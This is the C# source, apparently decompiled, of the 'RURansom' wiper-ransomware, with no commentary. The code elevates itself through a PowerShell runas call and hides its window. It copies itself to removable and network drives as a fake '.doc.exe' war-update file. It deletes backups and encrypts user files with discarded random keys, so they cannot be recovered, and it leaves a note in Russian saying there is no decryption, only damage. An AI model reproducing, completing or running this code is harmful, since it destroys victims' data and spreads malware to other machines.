using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace RURansom;

internal class Program
{
	private static bool IsElevated => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main()
	{
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		if (!IsRussia())
		{
			if (!IsElevated)
			{
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.Arguments = "/c powershell stART-PRoceSS " + Assembly.GetExecutingAssembly().Location + " -veRB rUnAS";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = false;
				process.Start();
				process.WaitForExit();
				Environment.Exit(0);
			}
			IntPtr consoleWindow = GetConsoleWindow();
			ShowWindow(consoleWindow, 0);
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
					{
						spread(driveInfo.Name.ToString());
					}
					if (driveInfo.Name.ToString() == "C:\\")
					{
						encryptAllDirectoryAndSubDirectoryFiles("C:\\Users\\" + Environment.UserName);
					}
					else
					{
						encryptAllDirectoryAndSubDirectoryFiles(driveInfo.Name.ToString());
					}
				}
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		MessageBox.Show((IWin32Window)null, "Программу могут запускать только российские пользователи", "ОШИБКА!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		Environment.Exit(0);
	}

	private static bool IsRussia()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.ipify.org");
			httpWebRequest.Method = "GET";
			httpWebRequest.ContentType = "text/html";
			httpWebRequest.Timeout = 1000000000;
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			string text = streamReader.ReadToEnd();
			HttpWebRequest httpWebRequest2 = (HttpWebRequest)WebRequest.Create("https://ip-api.com/#" + text);
			httpWebRequest2.Method = "GET";
			httpWebRequest2.ContentType = "text/html";
			httpWebRequest2.Timeout = httpWebRequest.Timeout;
			_ = (HttpWebResponse)httpWebRequest.GetResponse();
			using (new StreamReader(httpWebResponse.GetResponseStream()))
			{
				streamReader.ReadToEnd();
				if (text.Contains("\"Russia\""))
				{
					return true;
				}
				return false;
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return false;
		}
	}

	private static void encryptAllDirectoryAndSubDirectoryFiles(string d)
	{
		try
		{
			if (!(d != "C:\\Users\\" + Environment.UserName + "\\AppData"))
			{
				return;
			}
			string[] files = Directory.GetFiles(d);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				if (Path.GetExtension(files[i])!.ToLower() == ".bak")
				{
					File.Delete(files[i]);
				}
				fileInfo.Attributes = FileAttributes.Normal;
				EncryptFile(files[i], d);
			}
			string[] directories = Directory.GetDirectories(d);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptAllDirectoryAndSubDirectoryFiles(directories[j] + "\\");
			}
		}
		catch (Exception)
		{
		}
	}

	private static void spread(string dp)
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Россия-Украина_Война-Обновление.doc.exe");
		}
		catch
		{
		}
	}

	private static void EncryptFile(string file, string dir)
	{
		try
		{
			string text = File.ReadAllText(file);
			if (!(text == ""))
			{
				new AesCrypter();
				byte[] bytes = Encoding.UTF8.GetBytes(text);
				string s = getEncryptedAesKey()[0];
				_ = getEncryptedAesKey()[1];
				byte[] inArray = AesCrypter.AES_Encrypt(bytes, Encoding.UTF8.GetBytes(s));
				string contents = Convert.ToBase64String(inArray);
				File.WriteAllText(file, contents);
				Path.ChangeExtension(file, ".fs_invade");
				Convert.ToBase64String(Encoding.UTF8.GetBytes(getEncryptedAesKey()[2]));
				string[] contents2 = new string[4] { "24 февраля президент Владимир Путин объявил войну Украине.", "Чтобы противостоять этому, я, создатель RU_Ransom, создал эту вредоносную программу для нанесения ущерба России. Вы купили это себе, господин президент.", "Нет никакого способа расшифровать ваши файлы. Никакой оплаты, только ущерб. И да, это \"миротворчество\", как это делает Влади Папа, убивая невинных мирных жителей", "И да, это было переведено с бангла на русский с помощью Google Translate..." };
				File.WriteAllLines(dir + "\\Полномасштабное_кибервторжение.txt", contents2);
			}
		}
		catch (Exception)
		{
		}
	}

	private static string[] getEncryptedAesKey()
	{
		new AesCrypter();
		byte[] bytes = Encoding.UTF8.GetBytes(BuildPassword("FullScaleCyberInvasion + " + Environment.MachineName));
		byte[] bytes2 = Encoding.UTF8.GetBytes(BuildPassword("RU_Ransom" + Environment.UserName + "2022"));
		byte[] inArray = AesCrypter.AES_Encrypt(bytes, bytes2);
		return new string[3]
		{
			Convert.ToBase64String(bytes),
			Convert.ToBase64String(bytes2),
			Convert.ToBase64String(inArray)
		};
	}

	private static string BuildPassword(string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < str.Length; i++)
		{
			stringBuilder.Append(str[random.Next(0, str.Length)]);
		}
		return stringBuilder.ToString();
	}
}
